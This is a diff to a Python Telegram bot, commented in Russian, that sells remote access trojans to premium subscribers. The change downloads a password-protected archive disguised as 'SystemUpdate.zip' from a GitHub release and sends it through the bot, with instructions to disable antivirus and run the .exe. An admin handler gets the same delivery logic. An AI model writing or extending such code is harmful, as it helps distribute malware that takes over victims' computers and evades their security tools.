@@ -6,6 +6,7 @@ import secrets
 import sqlite3
 import urllib.parse
 import threading
+import requests
 from datetime import datetime, timedelta
 from dotenv import load_dotenv
 
@@ -21,7 +22,6 @@ ADMIN_IDS   = [int(x) for x in (os.environ.get("ADMIN_IDS") or "8297446667").spl
 LOG_CHAT_ID = int(os.environ.get("LOG_CHAT_ID") or "-1004382024668")
 WORKER_URL  = os.environ.get("WORKER_URL") or "https://trak.geminialex12.workers.dev"
 DB_PATH     = os.environ.get("DB_PATH") or "/tmp/database2.db"
-RAT_FILE    = "rat.exe"
 
 CHANNEL_ID    = -1004336153105
 CHANNEL_LINK  = "https://t.me/+c3xyHely39ozNDYy"
@@ -29,6 +29,9 @@ SUPPORT       = "@boyfrer"
 REF_REWARD    = 0.1
 REF_MARKUP    = 0.5
 BOT_LINK      = "https://t.me/StarsLogg_Robot?start=" 
+
+# Твоя ссылка на архив с RAT
+RAT_URL = "https://github.com/geminialex12-hue/Ekskks/releases/download/V1.0/SystemUpdate.zip"
 
 # ---------- BOT / TELEGRAPH ----------
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
@@ -390,11 +393,28 @@ def cb_pay_tariff(call):
 
 @bot.callback_query_handler(func=lambda c: c.data == 'get_rat_exe')
 def cb_get_rat_exe(call):
+    if not is_premium(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
+        return bot.answer_callback_query(call.id, "❌ Только Premium!", show_alert=True)
+    
+    msg = bot.send_message(call.from_user.id, "⏳ Загружаю файл с GitHub...")
     try:
-        with open(RAT_FILE, 'rb') as f:
-            bot.send_document(call.from_user.id, f, caption="🦠 <b>Ваш RAT</b>\n1. Отключите антивирус.\n2. Запустите от Админа.")
-    except:
-        bot.send_message(call.from_user.id, f"❌ Файл {RAT_FILE} не найден.")
+        r = requests.get(RAT_URL, stream=True)
+        r.raise_for_status()
+        
+        bot.send_document(
+            call.from_user.id, 
+            r.raw, 
+            caption="🦠 <b>Ваш RAT-клиент</b>\n\n"
+                    "<b>Инструкция:</b>\n"
+                    "1. Скачайте архив.\n"
+                    "2. Распакуйте (пароль: 123).\n"
+                    "3. Отключите антивирус.\n"
+                    "4. Запустите .exe."
+        )
+        bot.delete_message(call.from_user.id, msg.message_id)
+    except Exception as e:
+        bot.edit_message_text(f"❌ Ошибка: {e}", call.from_user.id, msg.message_id)
+    
     bot.answer_callback_query(call.id)
 
 # ---------- ADMIN ----------
@@ -403,9 +423,14 @@ def cmd_admin(m): admin_menu(m.chat.id)
 
 @bot.callback_query_handler(func=lambda c: c.data == 'admin_get_rat' and c.from_user.id in ADMIN_IDS)
 def cb_admin_get_rat(call):
+    msg = bot.send_message(call.from_user.id, "⏳ Загружаю файл...")
     try:
-        with open(RAT_FILE, 'rb') as f: bot.send_document(call.from_user.id, f, caption="🦠 <b>RAT (Админ)</b>")
-    except: bot.send_message(call.from_user.id, f"❌ Файл не найден.")
+        r = requests.get(RAT_URL, stream=True)
+        r.raise_for_status()
+        bot.send_document(call.from_user.id, r.raw, caption="🦠 <b>RAT (Админ)</b>")
+        bot.delete_message(call.from_user.id, msg.message_id)
+    except Exception as e:
+        bot.edit_message_text(f"❌ Ошибка: {e}", call.from_user.id, msg.message_id)
     bot.answer_callback_query(call.id)
 
 @bot.callback_query_handler(func=lambda c: c.data == 'admin_give_bal' and c.from_user.id in ADMIN_IDS)
